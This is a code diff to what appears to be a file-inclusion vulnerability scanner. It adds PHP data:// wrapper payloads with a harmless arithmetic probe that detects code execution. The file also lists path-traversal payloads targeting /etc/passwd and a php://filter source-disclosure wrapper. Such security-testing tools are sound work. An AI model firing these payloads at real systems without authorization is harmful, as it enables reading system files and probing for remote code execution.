@@ -18,6 +18,7 @@ when no request got an answer.
 from __future__ import annotations
 
 import argparse
+import base64
 import re
 import sys
 import time
@@ -48,6 +49,18 @@ PAYLOADS = [
     ("null byte /etc/passwd%00.png", _UP + "etc/passwd%00.png"),
     ("trailing dot /etc/passwd....", _UP + "etc/passwd...."),
     ("php filter wrapper (source disclosure)", "php://filter/convert.base64-encode/resource=index"),
+]
+
+# Inclusion-execution markers: a benign payload that, if the parameter includes AND runs
+# the content, evaluates an arithmetic expression. Seeing the computed EXEC_RESULT proves
+# code execution; seeing EXEC_SOURCE (the un-evaluated expression) means the file was
+# included but only displayed. No OS command is run and no external host is contacted.
+EXEC_SOURCE = "31337*31337"
+EXEC_RESULT = "982007569"                      # 31337 * 31337
+_PHP = base64.b64encode(f"<?php echo {EXEC_SOURCE}; ?>".encode()).decode()
+EXEC_PAYLOADS = [
+    ("php data:// wrapper (code execution)", f"data://text/plain;base64,{_PHP}"),
+    ("php data:// wrapper, url-encoded", "data://text/plain;base64," + _PHP.replace("=", "%3d")),
 ]
 
 # A response matching one of these almost certainly contains an out-of-scope file.
@@ -195,6 +208,20 @@ def run(args) -> int:
                 flag = "   <= changed a lot from the baseline (check the excerpt)"
             print(f"   {label}: {a.short()}{flag}")
             if hit or flag:
+                print(f"       excerpt: {_excerpt(a.body)}")
+        for label, payload in EXEC_PAYLOADS:
+            if args.pause:
+                time.sleep(args.pause)
+            a = ep.fetch(c.url(pr.base, payload), cookie)
+            sent += 1
+            answered += a.status is not None
+            flag = ""
+            if a.status == 200 and EXEC_RESULT in a.body:
+                flag = "   <= CODE EXECUTION: the included wrapper ran (evaluated an expression)"
+            elif a.status == 200 and EXEC_SOURCE in a.body:
+                flag = "   <= included but shown as source, not executed"
+            print(f"   {label}: {a.short()}{flag}")
+            if flag:
                 print(f"       excerpt: {_excerpt(a.body)}")
     if over:
         print()
